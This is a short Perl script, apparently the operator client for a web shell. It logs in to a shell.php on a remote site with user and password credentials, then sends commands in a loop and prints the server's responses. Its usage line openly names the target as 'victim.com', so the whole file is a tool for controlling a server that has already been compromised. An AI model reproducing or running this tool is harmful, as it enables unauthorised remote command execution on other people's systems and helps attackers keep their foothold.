#!/usr/bin/perl
use strict;
use warnings;
use lib::shell::shell;

use lib::protocol2::protocol;
use lib::network::network;

use config::default;
my $DEBUG = 0;
my $shell = new shell({ debug       => $DEBUG,
                        verbosity   => $DEBUG,
                        echo        => $DEBUG,
                        protocol    => new protocol({
                                interface   => 'old',
                                network     => new network(),
                                debug       => $DEBUG,
                                verbosity   => $DEBUG,
                            }),
                    });

$shell->log("Starting shell");
$shell->attach('config/handlers.json', 'lib/handlers.pm');

if (defined $ARGV[0] && $shell->shellLogin($ARGV[0])) {
    $shell->prompt();
    while (my $cmd = $shell->process()) {
        my $response = $shell->execute($cmd->{command}, $cmd->{params});
        if ($response != 0 && defined $response->{response}) {
            print $response->{response};
        } else {
            print 'Error grabbing response from server!\n';
        }
        $shell->prompt();   
    }
    $shell->saveState();
}else{
    print "USAGE \n\t ./shell.pl user:pass\@http://victim.com/path/to/shell/shell.php\n";
}

$shell->log("Terminating shell");
